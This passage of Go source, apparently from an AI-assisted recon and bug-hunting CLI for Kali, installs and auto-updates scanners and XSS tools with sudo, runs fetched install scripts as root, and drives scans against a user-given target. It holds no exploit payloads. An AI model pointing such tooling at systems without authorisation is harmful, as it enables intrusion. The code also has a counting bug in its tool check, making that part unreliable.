	exec.Command("sudo", "chmod", "+x", wrapperPath).Run()

	// Verify
	if _, err := exec.LookPath(name); err == nil {
		return nil
	}
	if _, err := os.Stat(scriptPath); err == nil {
		return nil
	}
	return fmt.Errorf("%s install incomplete", name)
}

// installReconftw installs reconftw via git clone — must run as root.
func installReconftw() error {
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ↳ Installing reconftw (git clone method)..."))

	// Remove old broken install
	exec.Command("sudo", "rm", "-rf", "/opt/reconftw").Run()
	exec.Command("sudo", "rm", "-f", "/usr/local/bin/reconftw").Run()

	// Clone
	cloneCmd := exec.Command("sudo", "git", "clone", "--depth=1",
		"https://github.com/six2dez/reconftw.git", "/opt/reconftw")
	cloneCmd.Stdout = os.Stdout
	cloneCmd.Stderr = os.Stderr
	if err := cloneCmd.Run(); err != nil {
		return fmt.Errorf("git clone failed: %v", err)
	}

	// Make scripts executable
	exec.Command("sudo", "chmod", "+x", "/opt/reconftw/reconftw.sh").Run()
	exec.Command("sudo", "chmod", "+x", "/opt/reconftw/install.sh").Run()

	// Run install.sh — partial failures are OK, reconftw still works
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ↳ Running reconftw/install.sh (5-15 min, errors are normal)..."))
	installCmd := exec.Command("sudo", "bash", "-c", "cd /opt/reconftw && ./install.sh")
	installCmd.Stdout = os.Stdout
	installCmd.Stderr = os.Stderr
	installCmd.Run() // intentionally ignore error — partial install is fine

	// Create proper wrapper that preserves working directory
	// reconftw MUST run from /opt/reconftw — it sources lib/ and modules/ relative to itself
	wrapperContent := "#!/bin/bash\nexec bash /opt/reconftw/reconftw.sh \"$@\"\n"
	writeCmd := exec.Command("sudo", "bash", "-c",
		fmt.Sprintf("cat > /usr/local/bin/reconftw << 'WRAPPER'\n%sWRAPPER\nchmod +x /usr/local/bin/reconftw", wrapperContent))
	writeCmd.Run()

	// Alternative: use tee
	teeCmd := exec.Command("sudo", "tee", "/usr/local/bin/reconftw")
	teeCmd.Stdin = strings.NewReader("#!/bin/bash\nexec bash /opt/reconftw/reconftw.sh \"$@\"\n")
	teeCmd.Run()
	exec.Command("sudo", "chmod", "+x", "/usr/local/bin/reconftw").Run()

	// Verify
	if _, err := os.Stat("/opt/reconftw/reconftw.sh"); err == nil {
		fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ reconftw installed at /opt/reconftw/reconftw.sh"))
		return nil
	}
	return fmt.Errorf("reconftw.sh not found after install")
}

// installX8 installs x8 from GitHub releases (binary) — avoids cargo/openssl issues.
func installX8() error {
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ↳ Downloading x8 binary from GitHub releases..."))

	// Method 1: Download pre-built binary from releases (fastest, no openssl issues)
	dlCmd := exec.Command("bash", "-c",
		`set -e
LATEST=$(curl -s https://api.github.com/repos/Sh1Yo/x8/releases/latest | grep browser_download_url | grep linux | grep x86_64 | grep -v '.sha' | cut -d'"' -f4 | head -1)
if [ -z "$LATEST" ]; then
  echo "No release binary found"
  exit 1
fi
echo "Downloading: $LATEST"
curl -sL "$LATEST" -o /tmp/x8_release
# Check if it's a tar.gz or direct binary
if file /tmp/x8_release | grep -q 'gzip\|tar'; then
  tar -xzf /tmp/x8_release -C /tmp/ 2>/dev/null || true
  find /tmp -name 'x8' -type f -exec sudo cp {} /usr/local/bin/x8 \; 2>/dev/null || true
else
  sudo cp /tmp/x8_release /usr/local/bin/x8
fi
sudo chmod +x /usr/local/bin/x8
x8 --version`)
	dlCmd.Stdout = os.Stdout
	dlCmd.Stderr = os.Stderr
	if err := dlCmd.Run(); err == nil {
		return nil
	}

	// Method 2: Build from source with proper deps
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ↳ Binary download failed, building from source..."))
	buildCmd := exec.Command("bash", "-c",
		`set -e
sudo apt-get install -y libssl-dev pkg-config build-essential curl git 2>/dev/null
export OPENSSL_DIR=/usr
export OPENSSL_LIB_DIR=/usr/lib/x86_64-linux-gnu
export OPENSSL_INCLUDE_DIR=/usr/include
export PKG_CONFIG_PATH=/usr/lib/x86_64-linux-gnu/pkgconfig
rm -rf /tmp/x8_src
git clone --depth=1 https://github.com/sh1yo/x8 /tmp/x8_src
cd /tmp/x8_src
cargo build --release
sudo cp ./target/release/x8 /usr/local/bin/x8
sudo chmod +x /usr/local/bin/x8
x8 --version`)
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr
	return buildCmd.Run()
}

// installRustscan installs rustscan via .deb release (most reliable on Kali).
func installRustscan() error {
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ↳ Downloading rustscan .deb from GitHub releases..."))
	dlCmd := exec.Command("bash", "-c",
		`LATEST=$(curl -s https://api.github.com/repos/RustScan/RustScan/releases/latest | grep browser_download_url | grep amd64.deb | cut -d'"' -f4) && `+
			`if [ -n "$LATEST" ]; then curl -sL "$LATEST" -o /tmp/rustscan.deb && sudo dpkg -i /tmp/rustscan.deb; `+
			`else echo "No .deb found"; exit 1; fi`)
	dlCmd.Stdout = os.Stdout
	dlCmd.Stderr = os.Stderr
	if err := dlCmd.Run(); err == nil {
		return nil
	}
	// Fallback: cargo install
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ↳ .deb failed, trying cargo install rustscan..."))
	exec.Command("sudo", "apt", "install", "-y", "libssl-dev", "pkg-config", "cargo").Run()
	cargoCmd := exec.Command("cargo", "install", "rustscan")
	cargoCmd.Stdout = os.Stdout
	cargoCmd.Stderr = os.Stderr
	return cargoCmd.Run()
}

// updateAllTools silently updates all installed tools to latest versions.
// Called automatically before /recon and /hunt to ensure latest tool versions.
// Errors are non-fatal — we log and continue.
func updateAllTools() {
	// Update apt tools (non-interactive, quiet)
	aptCmd := exec.Command("sudo", "apt", "update", "-qq")
	aptCmd.Run() // ignore error — may not have sudo

	// Update Go tools
	goTools := []struct{ bin, module string }{
		{"subfinder", "github.com/projectdiscovery/subfinder/v2/cmd/subfinder"},
		{"httpx", "github.com/projectdiscovery/httpx/cmd/httpx"},
		{"nuclei", "github.com/projectdiscovery/nuclei/v3/cmd/nuclei"},
		{"naabu", "github.com/projectdiscovery/naabu/v2/cmd/naabu"},
		{"dnsx", "github.com/projectdiscovery/dnsx/cmd/dnsx"},
		{"tlsx", "github.com/projectdiscovery/tlsx/cmd/tlsx"},
		{"katana", "github.com/projectdiscovery/katana/cmd/katana"},
		{"gau", "github.com/lc/gau/v2/cmd/gau"},
		{"waybackurls", "github.com/tomnomnom/waybackurls"},
		{"dalfox", "github.com/hahwul/dalfox/v2"},
	}

	homedir, _ := os.UserHomeDir()
	for _, gt := range goTools {
		if _, err := exec.LookPath(gt.bin); err != nil {
			continue // not installed, skip update
		}
		cmd := exec.Command("go", "install", gt.module+"@latest")
		cmd.Run() // ignore error
		// Re-symlink in case binary path changed
		for _, gobin := range []string{homedir + "/go/bin/" + gt.bin, "/root/go/bin/" + gt.bin} {
			if _, err := os.Stat(gobin); err == nil {
				exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/"+gt.bin).Run()
				break
			}
		}
	}

	// Update nuclei templates
	if _, err := exec.LookPath("nuclei"); err == nil {
		exec.Command("nuclei", "-update-templates", "-silent").Run()
	}

	// Update reconftw if installed
	if _, err := os.Stat("/opt/reconftw/.git"); err == nil {
		pullCmd := exec.Command("git", "-C", "/opt/reconftw", "pull", "origin", "main", "--quiet")
		pullCmd.Run()
	}

	fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ Tools updated"))
}

func main() {
	args := os.Args[1:]

	if len(args) == 0 {
		// BUG FIX: Load storage BEFORE NewModel so history context works
		if err := storage.Load(); err != nil {
			fmt.Println("Warning: could not load history:", err)
		}
		printBanner()
		p := tea.NewProgram(ui.NewModel(getLocalIP()))
		if _, err := p.Run(); err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		return
	}

	cmd := strings.ToLower(args[0])

	// All /slash commands are Linux-only — catch them early on Windows
	// PowerShell may pass /command differently, so check both with and without leading slash
	if runtime.GOOS != "linux" {
		normalized := strings.TrimPrefix(cmd, "/")
		linuxOnlyCmds := map[string]bool{
			"recon": true, "hunt": true, "tools": true,
			"install-tools": true, "install-hunt": true, "doctor": true,
		}
		if linuxOnlyCmds[normalized] || strings.HasPrefix(cmd, "/") {
			printError("This command is only available on Linux/Kali.")
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  /recon, /hunt, /doctor, /tools, /install-tools require Linux"))
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Use: cybermind recon <target>  for AI-guided recon on Windows"))
			os.Exit(1)
		}
	}

	switch cmd {

	case "help", "--help", "-h":
		printBanner()
		printHelp()

	case "version", "--version", "-v":
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  CyberMind CLI v" + Version))
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  github.com/thecnical"))

	case "/recon":
		// Linux-only auto recon
		if runtime.GOOS != "linux" {
			printError("Auto Recon Mode is only available on Linux/Kali.")
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Use: cybermind recon <target> for AI-guided recon on Windows"))
			os.Exit(1)
		}
		if len(args) < 2 {
			printError("Usage: cybermind /recon <target> [--tools tool1,tool2]")
			printError("Example: cybermind /recon 192.168.1.1")
			printError("Example: cybermind /recon example.com --tools nmap,httpx,nuclei")
			os.Exit(1)
		}
		target, requested, parseErr := parseToolsFlag(args[1:])
		if parseErr != nil {
			printError(parseErr.Error())
			os.Exit(1)
		}
		// Security: validate target
		if err := recon.ValidateTarget(target); err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		if err := storage.Load(); err != nil {
			fmt.Println("Warning:", err)
		}
		// Auto-update all tools before running recon — ensures latest versions
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ⟳ Updating tools before recon..."))
		updateAllTools()
		runAutoRecon(target, requested)

	case "/tools":
		// Show available recon tools
		if runtime.GOOS != "linux" {
			printError("Tool check is only available on Linux/Kali.")
			os.Exit(1)
		}
		tools := recon.CheckTools()
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  🛠  Recon Tools Status"))
		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 40)))
		for tool, available := range tools {
			if available {
				fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ " + tool))
			} else {
				fmt.Println(lipgloss.NewStyle().Foreground(red).Render("  ✗ " + tool + " (not installed)"))
			}
		}
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Install missing: sudo apt install nmap whois dnsutils"))
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Go tools: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"))
		fmt.Println()

	case "/hunt":
		// Linux-only hunt mode
		if runtime.GOOS != "linux" {
			printError("Hunt Mode is only available on Linux/Kali.")
			os.Exit(1)
		}
		if len(args) < 2 {
			printError("Usage: cybermind /hunt <target> [--tools tool1,tool2]")
			printError("Example: cybermind /hunt example.com")
			printError("Example: cybermind /hunt example.com --tools dalfox,nuclei-hunt")
			os.Exit(1)
		}
		// Parse target and optional --tools flag
		huntTarget := args[1]
		var huntRequested []string
		for i := 2; i < len(args); i++ {
			if args[i] == "--tools" && i+1 < len(args) {
				for _, n := range strings.Split(args[i+1], ",") {
					n = strings.TrimSpace(n)
					if n != "" {
						huntRequested = append(huntRequested, n)
					}
				}
				i++
			}
		}
		if len(huntRequested) > 0 {
			validSet := make(map[string]bool)
			for _, n := range hunt.HuntToolNames() {
				validSet[n] = true
			}
			for _, t := range huntRequested {
				if !validSet[t] {
					printError(fmt.Sprintf("unknown hunt tool %q — valid: %s",
						t, strings.Join(hunt.HuntToolNames(), ", ")))
					os.Exit(1)
				}
			}
		}
		if err := storage.Load(); err != nil {
			fmt.Println("Warning:", err)
		}
		// Security: validate target
		if err := recon.ValidateTarget(huntTarget); err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		// Auto-update all tools before running hunt — ensures latest versions
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ⟳ Updating tools before hunt..."))
		updateAllTools()
		// Manual mode — no recon context
		runHunt(huntTarget, nil, huntRequested)

	case "/doctor":
		// Full health check for all recon + hunt tools, auto-install missing ones
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  🩺 CyberMind Doctor — Tool Health Check"))
		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
		fmt.Println()

		type toolEntry struct {
			name    string
			mode    string
			install string
			isGo    bool
			isCargo bool
		}

		allTools := []toolEntry{
			// Recon Phase 1
			{"whois", "recon", "sudo apt install whois", false, false},
			{"theHarvester", "recon", "sudo apt install theharvester", false, false},
			{"dig", "recon", "sudo apt install dnsutils", false, false},
			// Recon Phase 2
			{"subfinder", "recon", "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", true, false},
			{"amass", "recon", "sudo apt install amass", false, false},
			{"dnsx", "recon", "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest", true, false},
			// Recon Phase 3
			{"rustscan", "recon", "cargo install rustscan", false, true},
			{"naabu", "recon", "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest", true, false},
			{"nmap", "recon", "sudo apt install nmap", false, false},
			{"masscan", "recon", "sudo apt install masscan", false, false},
			// Recon Phase 4
			{"httpx", "recon", "go install github.com/projectdiscovery/httpx/cmd/httpx@latest", true, false},
			{"whatweb", "recon", "sudo apt install whatweb", false, false},
			{"tlsx", "recon", "go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest", true, false},
			// Recon Phase 5
			{"ffuf", "recon", "sudo apt install ffuf", false, false},
			{"feroxbuster", "recon", "sudo apt install feroxbuster", false, false},
			{"gobuster", "recon", "sudo apt install gobuster", false, false},
			// Recon Phase 6
			{"nuclei", "recon", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", true, false},
			{"nikto", "recon", "sudo apt install nikto", false, false},
			{"katana", "recon", "go install github.com/projectdiscovery/katana/cmd/katana@latest", true, false},
	// Hunt tools — upgraded arsenal
	{"gau", "hunt", "go install github.com/lc/gau/v2/cmd/gau@latest", true, false},
	{"waymore", "hunt", "go install github.com/xnl-h4ck3r/waymore@latest", true, false},
	{"waybackurls", "hunt", "go install github.com/tomnomnom/waybackurls@latest", true, false},
	{"gospider", "hunt", "go install github.com/jaeles-project/gospider@latest", true, false},
	{"dalfox", "hunt", "go install github.com/hahwul/dalfox/v2@latest", true, false},
	{"paramspider", "hunt", "git clone https://github.com/devanshbatham/ParamSpider /opt/ParamSpider && pip3 install -r /opt/ParamSpider/requirements.txt -q && sudo ln -sf /opt/ParamSpider/paramspider.py /usr/local/bin/paramspider && sudo chmod +x /usr/local/bin/paramspider", false, false},
	{"arjun", "hunt", "pip3 install arjun -q", false, false},
	{"xsstrike", "hunt", "git clone https://github.com/s0md3v/XSStrike.git /opt/XSStrike && pip3 install -r /opt/XSStrike/requirements.txt -q && sudo ln -sf /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike && sudo chmod +x /usr/local/bin/xsstrike", false, false},
	// reconftw — meta subdomain tool
	{"reconftw", "recon", "git clone https://github.com/six2dez/reconftw.git /opt/reconftw && cd /opt/reconftw && ./install.sh", false, false},
		}

		var missing []toolEntry
		reconOK := 0
		huntOK := 0

		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  RECON TOOLS (17):"))
		for _, t := range allTools {
			if t.mode != "recon" {
				continue
			}
			if _, err := exec.LookPath(t.name); err == nil {
				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", t.name)))
				reconOK++
			} else {
				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s MISSING", t.name)))
				missing = append(missing, t)
				reconOK-- // offset the increment that didn't happen
			}
		}

		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render("  HUNT TOOLS (8):"))
		for _, t := range allTools {
			if t.mode != "hunt" {
				continue
			}
			if _, err := exec.LookPath(t.name); err == nil {
				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", t.name)))
				huntOK++
			} else {
				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s MISSING", t.name)))
				missing = append(missing, t)
			}
		}

		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
		fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
			fmt.Sprintf("  Recon: %d/17 installed", reconOK)))
		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#FF6600")).Render(
			fmt.Sprintf("  Hunt:  %d/8 installed", huntOK)))

		if len(missing) == 0 {
			fmt.Println()
			fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(green).Render("  ✓ All tools installed — ready to hunt!"))
			fmt.Println()
		} else {
			fmt.Println()
			fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(yellow).Render(
				fmt.Sprintf("  ⚡ %d tools missing — installing now...", len(missing))))
			fmt.Println()

			instOK, instFail := 0, 0
			for _, t := range missing {
				fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-16s installing...", t.name)))

				var installErr error

				switch t.name {
				case "reconftw":
					installErr = installReconftw()

				case "x8":
					installErr = installX8()

				case "rustscan":
					installErr = installRustscan()

				case "naabu":
					exec.Command("sudo", "apt", "install", "-y", "libpcap-dev").Run()
					cmd2 := exec.Command("go", "install", "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest")
					cmd2.Stdout = os.Stdout
					cmd2.Stderr = os.Stderr
					installErr = cmd2.Run()
					if installErr == nil {
						homedir2, _ := os.UserHomeDir()
						for _, gobin := range []string{homedir2 + "/go/bin/naabu", "/root/go/bin/naabu"} {
							if _, err2 := os.Stat(gobin); err2 == nil {
								exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/naabu").Run()
								break
							}
						}
					}

				case "paramspider":
					installErr = installPythonGitTool(
						"paramspider",
						"https://github.com/devanshbatham/ParamSpider",
						"/opt/ParamSpider",
						"paramspider.py",
					)

				case "arjun":
					installErr = installPythonPipTool("arjun")

				case "xsstrike":
					installErr = installPythonGitTool(
						"xsstrike",
						"https://github.com/s0md3v/XSStrike",
						"/opt/XSStrike",
						"xsstrike.py",
					)

				case "waymore":
					cmd2 := exec.Command("go", "install", "github.com/xnl-h4ck3r/waymore@latest")
					cmd2.Stdout = os.Stdout
					cmd2.Stderr = os.Stderr
					installErr = cmd2.Run()
					if installErr == nil {
						homedir2, _ := os.UserHomeDir()
						for _, gobin := range []string{homedir2 + "/go/bin/waymore", "/root/go/bin/waymore"} {
							if _, err2 := os.Stat(gobin); err2 == nil {
								exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/waymore").Run()
								break
							}
						}
					}

				case "gospider":
					cmd2 := exec.Command("go", "install", "github.com/jaeles-project/gospider@latest")
					cmd2.Stdout = os.Stdout
					cmd2.Stderr = os.Stderr
					installErr = cmd2.Run()
					if installErr == nil {
						homedir2, _ := os.UserHomeDir()
						for _, gobin := range []string{homedir2 + "/go/bin/gospider", "/root/go/bin/gospider"} {
							if _, err2 := os.Stat(gobin); err2 == nil {
								exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/gospider").Run()
								break
							}
						}
					}

				case "gf":
					cmd2 := exec.Command("go", "install", "github.com/tomnomnom/gf@latest")
					cmd2.Stdout = os.Stdout
					cmd2.Stderr = os.Stderr
					installErr = cmd2.Run()
					if installErr == nil {
						homedir2, _ := os.UserHomeDir()
						for _, gobin := range []string{homedir2 + "/go/bin/gf", "/root/go/bin/gf"} {
							if _, err2 := os.Stat(gobin); err2 == nil {
								exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/gf").Run()
								break
							}
						}
						// Install gf patterns
						exec.Command("bash", "-c",
							"git clone --depth=1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gf-patterns 2>/dev/null; "+
								"mkdir -p ~/.gf; cp /tmp/gf-patterns/*.json ~/.gf/ 2>/dev/null || true").Run()
					}

				default:
					if t.isCargo {
						// Install openssl deps first for any cargo tool
						exec.Command("sudo", "apt", "install", "-y", "libssl-dev", "pkg-config").Run()
						if _, cargoErr := exec.LookPath("cargo"); cargoErr != nil {
							exec.Command("sudo", "apt", "install", "-y", "cargo").Run()
						}
						cmd2 := exec.Command("cargo", "install", t.name)
						cmd2.Stdout = os.Stdout
						cmd2.Stderr = os.Stderr
						installErr = cmd2.Run()
						if installErr == nil {
							homedir2, _ := os.UserHomeDir()
							cargobin := homedir2 + "/.cargo/bin/" + t.name
							if _, err2 := os.Stat(cargobin); err2 == nil {
								exec.Command("sudo", "ln", "-sf", cargobin, "/usr/local/bin/"+t.name).Run()
							}
						}
					} else if t.isGo {
						parts := strings.Fields(t.install)
						cmd2 := exec.Command("go", "install", parts[len(parts)-1])
						cmd2.Stdout = os.Stdout
						cmd2.Stderr = os.Stderr
						installErr = cmd2.Run()
						if installErr == nil {
							homedir2, _ := os.UserHomeDir()
							for _, gobin := range []string{homedir2 + "/go/bin/" + t.name, "/root/go/bin/" + t.name} {
								if _, err2 := os.Stat(gobin); err2 == nil {
									exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/"+t.name).Run()
									break
								}
							}
						}
					} else {
						// Python/git tools — use bash to run the install string
						cmd2 := exec.Command("bash", "-c", t.install)
						cmd2.Stdout = os.Stdout
						cmd2.Stderr = os.Stderr
						installErr = cmd2.Run()
					}
				}

				if installErr != nil {
					fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s failed: %v", t.name, installErr)))
					// Send error to AI for diagnosis
					errMsg := fmt.Sprintf("Tool installation failed: %s\nError: %v\nOS: Linux/Kali\nPlease provide exact fix commands.", t.name, installErr)
					if fix, aiErr := api.SendPrompt(errMsg); aiErr == nil {
						fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  💡 AI Fix suggestion:"))
						fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#E0E0E0")).MarginLeft(4).Render(fix))
					}
					instFail++
				} else {
					fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", t.name)))
					instOK++
				}
			}
			fmt.Println()
			fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render(
				fmt.Sprintf("  Doctor complete: %d installed, %d failed", instOK, instFail)))
			fmt.Println()
		}

	case "/install-tools":
		if runtime.GOOS != "linux" {
			printError("/install-tools is only available on Linux.")
			os.Exit(1)
		}
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  🛠  Installing All CyberMind Tools (Recon + Hunt)"))
		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 55)))
		fmt.Println()

		installed, skipped2, failed := 0, 0, 0

		// Helper: run command and report result
		runInstall := func(name string, cmd2 *exec.Cmd) bool {
			cmd2.Stdout = os.Stdout
			cmd2.Stderr = os.Stderr
			if err := cmd2.Run(); err != nil {
				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s failed: %v", name, err)))
				failed++
				return false
			}
			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", name)))
			installed++
			return true
		}

		// Helper: symlink Go binary to /usr/local/bin
		symlinkGo := func(bin string) {
			homedir2, _ := os.UserHomeDir()
			for _, gobin := range []string{homedir2 + "/go/bin/" + bin, "/root/go/bin/" + bin} {
				if _, err2 := os.Stat(gobin); err2 == nil {
					exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/"+bin).Run()
					return
				}
			}
		}

		// ── Step 1: apt dependencies first ──────────────────────────────────
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  [1/4] Installing apt tools..."))
		aptTools := []string{
			"nmap", "masscan", "whois", "dnsutils", "theharvester",
			"whatweb", "ffuf", "feroxbuster", "gobuster", "nikto", "amass",
			"libpcap-dev", "build-essential", "git", "cargo",
		}
		for _, tool := range aptTools {
			if _, err := exec.LookPath(tool); err == nil {
				fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  - %-16s already installed", tool)))
				skipped2++
				continue
			}
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-16s installing...", tool)))
			runInstall(tool, exec.Command("sudo", "apt", "install", "-y", tool))
		}

		// ── Step 2: rustscan from GitHub (not in apt) ────────────────────────
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  [2/4] Installing rustscan..."))
		if _, err := exec.LookPath("rustscan"); err == nil {
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  - rustscan         already installed"))
			skipped2++
		} else {
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ rustscan         installing from GitHub..."))
			// Try cargo install first (fastest)
			if _, cargoErr := exec.LookPath("cargo"); cargoErr == nil {
				if runInstall("rustscan", exec.Command("cargo", "install", "rustscan")) {
					symlinkGo("rustscan")
				}
			} else {
				// Fallback: download latest release binary
				dlCmd := exec.Command("bash", "-c",
					`LATEST=$(curl -s https://api.github.com/repos/RustScan/RustScan/releases/latest | grep browser_download_url | grep amd64.deb | cut -d'"' -f4) && curl -sL "$LATEST" -o /tmp/rustscan.deb && sudo dpkg -i /tmp/rustscan.deb`)
				if runInstall("rustscan", dlCmd) {
					// already in /usr/bin from dpkg
				}
			}
		}

		// ── Step 3: Go tools ─────────────────────────────────────────────────
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  [3/4] Installing Go tools..."))
		goTools := []struct{ bin, module string }{
			{"subfinder", "github.com/projectdiscovery/subfinder/v2/cmd/subfinder"},
			{"httpx", "github.com/projectdiscovery/httpx/cmd/httpx"},
			{"nuclei", "github.com/projectdiscovery/nuclei/v3/cmd/nuclei"},
			{"naabu", "github.com/projectdiscovery/naabu/v2/cmd/naabu"},
			{"dnsx", "github.com/projectdiscovery/dnsx/cmd/dnsx"},
			{"tlsx", "github.com/projectdiscovery/tlsx/cmd/tlsx"},
			{"katana", "github.com/projectdiscovery/katana/cmd/katana"},
			{"gau", "github.com/lc/gau/v2/cmd/gau"},
			{"waybackurls", "github.com/tomnomnom/waybackurls"},
			{"dalfox", "github.com/hahwul/dalfox/v2"},
			{"waymore", "github.com/xnl-h4ck3r/waymore"},
			{"gospider", "github.com/jaeles-project/gospider"},
		}
		for _, gt := range goTools {
			if _, err := exec.LookPath(gt.bin); err == nil {
				fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  - %-16s already installed", gt.bin)))
				skipped2++
				continue
			}
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-16s installing...", gt.bin)))
			if runInstall(gt.bin, exec.Command("go", "install", gt.module+"@latest")) {
				symlinkGo(gt.bin)
			}
		}

		// ── Step 4: x8 via cargo ─────────────────────────────────────────────
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  [4/5] Installing x8 (hidden param discovery)..."))
		if _, err := exec.LookPath("x8"); err == nil {
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  - x8               already installed"))
			skipped2++
		} else if _, cargoErr := exec.LookPath("cargo"); cargoErr != nil {
			fmt.Println(lipgloss.NewStyle().Foreground(red).Render("  ✗ x8               cargo not found — run: sudo apt install cargo"))
			failed++
		} else {
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ x8               installing via cargo (may take a few minutes)..."))
			if runInstall("x8", exec.Command("cargo", "install", "x8")) {
				// cargo installs to ~/.cargo/bin
				homedir2, _ := os.UserHomeDir()
				x8bin := homedir2 + "/.cargo/bin/x8"
				if _, err2 := os.Stat(x8bin); err2 == nil {
					exec.Command("sudo", "ln", "-sf", x8bin, "/usr/local/bin/x8").Run()
				}
			}
		}

		// ── Step 4.5: Python hunt tools ──────────────────────────────────────
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  [4.5/6] Installing Python hunt tools..."))

		// Ensure pip3 available
		exec.Command("sudo", "apt", "install", "-y", "python3-pip", "python3-venv", "-qq").Run()

		pythonTools := []struct {
			bin     string
			pipPkg  string
			gitRepo string
			gitDir  string
			script  string
		}{
			{"arjun", "arjun", "", "", ""},
			{"paramspider", "", "https://github.com/devanshbatham/ParamSpider", "/opt/ParamSpider", "paramspider.py"},
			{"xsstrike", "", "https://github.com/s0md3v/XSStrike.git", "/opt/XSStrike", "xsstrike.py"},
		}

		for _, pt := range pythonTools {
			if _, err := exec.LookPath(pt.bin); err == nil {
				fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  - %-16s already installed", pt.bin)))
				skipped2++
				continue
			}
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-16s installing...", pt.bin)))

			var installOK bool
			if pt.pipPkg != "" {
				// pip install
				cmd2 := exec.Command("pip3", "install", pt.pipPkg, "-q", "--break-system-packages")
				cmd2.Stdout = os.Stdout
				cmd2.Stderr = os.Stderr
